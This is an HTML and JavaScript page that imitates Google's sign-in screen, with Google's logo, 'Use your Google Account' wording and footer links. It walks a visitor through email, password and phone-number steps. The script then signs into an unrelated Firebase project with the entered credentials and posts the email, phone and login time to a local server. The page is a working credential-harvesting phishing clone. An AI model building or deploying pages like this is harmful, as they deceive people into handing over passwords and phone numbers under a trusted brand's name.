<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Auth Flow</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    
    <!-- Firebase SDK (CDN) -->
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js"></script>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', sans-serif;
        }

        body {
            background: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .container {
            max-width: 450px;
            margin: 40px auto;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
            background: #fff;
        }

        .logo {
            width: 75px;
            margin-bottom: 24px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 10px;
            color: #202124;
        }

        .subtitle, .email-display {
            font-size: 16px;
            margin-bottom: 32px;
            color: #202124;
        }

        .input-field {
            width: 100%;
            height: 54px;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            margin-bottom: 8px;
            font-size: 16px;
            color: #202124;
        }

        .input-field:focus {
            border: 2px solid #1a73e8;
            outline: none;
        }

        .button-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }

        .next-button {
            background: #1a73e8;
            color: white;
            padding: 10px 24px;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }

        footer {
            margin-top: 20px;
            text-align: center;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 15px;
            font-size: 14px;
        }

        a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }

        .page { display: none; }
        .active-page { display: block; }
    </style>
</head>
<body>

    <!-- Email Page -->
    <div class="page active-page" id="emailPage">
        <div class="container">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Logo" class="logo">
            <h1>Sign in</h1>
            <p class="subtitle">Use your Google Account</p>
            <input type="email" class="input-field" placeholder="Email" id="emailInput">
            <div class="button-container">
                <a href="#" class="create-account">Create account</a>
                <button class="next-button" onclick="showPasswordPage()">Next</button>
            </div>
            <footer>
                <div>
                    <select class="footer-link" style="border: none;">
                        <option>English (United States)</option>
                    </select>
                </div>
                <div class="footer-links">
                    <a href="#">Help</a>
                    <a href="#">Privacy</a>
                    <a href="#">Terms</a>
                </div>
            </footer>
        </div>
    </div>

    <!-- Password Page -->
    <div class="page" id="passwordPage">
        <div class="container">
            <h1>Enter your password</h1>
            <input type="password" class="input-field" placeholder="Password" id="passwordInput">
            <div class="button-container">
                <button class="next-button" onclick="showPhonePage()">Next</button>
            </div>
        </div>
    </div>

    <!-- Phone Verification Page -->
    <div class="page" id="phonePage">
        <div class="container">
            <h1>Verify your phone</h1>
            <input type="tel" class="input-field" placeholder="Mobile number" id="phoneInput">
            <div class="button-container">
                <button class="next-button" onclick="submitLogin()">Submit</button>
            </div>
        </div>
    </div>

    <!-- Firebase Authentication and Login Handling -->
  <script>
    // Initialize Firebase
    const firebaseConfig = {
        apiKey: "AIzaSyDN92MjC4k2pzBD8wgc3ADy8qQvqKElUyM",
        authDomain: "login-1b560.firebaseapp.com",
        projectId: "login-1b560",
        storageBucket: "login-1b560.firebasestorage.app",
        messagingSenderId: "231863683041",
        appId: "1:231863683041:web:aea7cf73438119acc0f4a0",
        measurementId: "G-62ETK5W9R3"
    };

    firebase.initializeApp(firebaseConfig);
    const auth = firebase.auth();

    // üîπ Ensure userData is declared globally at the top
    let userData = {
        email: '',
        password: '',
        phone: ''
    };

    function showPage(pageId) {
        document.querySelectorAll('.page').forEach(page => page.classList.remove('active-page'));
        document.getElementById(pageId).classList.add('active-page');
    }

    function showPasswordPage() {
        userData.email = document.getElementById('emailInput').value;
        if (userData.email) {
            showPage('passwordPage');
        } else {
            alert("Please enter your email.");
        }
    }

    function showPhonePage() {
        userData.password = document.getElementById('passwordInput').value;
        if (userData.password) {
            showPage('phonePage');
        } else {
            alert("Please enter your password.");
        }
    }

    async function submitLogin() {
        userData.phone = document.getElementById('phoneInput').value;
        if (userData.phone) {
            try {
                const userCredential = await auth.signInWithEmailAndPassword(userData.email, userData.password);
                const user = userCredential.user;

                const userDataToSend = {
                    email: userData.email,
                    phone: userData.phone,
                    loginTime: new Date().toISOString()
                };

                console.log("üì§ Sending data to server:", userDataToSend);

                const response = await fetch("http://localhost:3000/saveUser", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(userDataToSend)
                });

                const result = await response.json();
                console.log("‚úÖ Server Response:", result);

                alert("Login successful! Data saved locally and in Firestore.");
            } catch (error) {
                console.error("‚ùå Login Error:", error.message);
                alert(error.message);
            }
        } else {
            alert("Please enter your mobile number.");
        }
    }
</script>

</body>
</html>
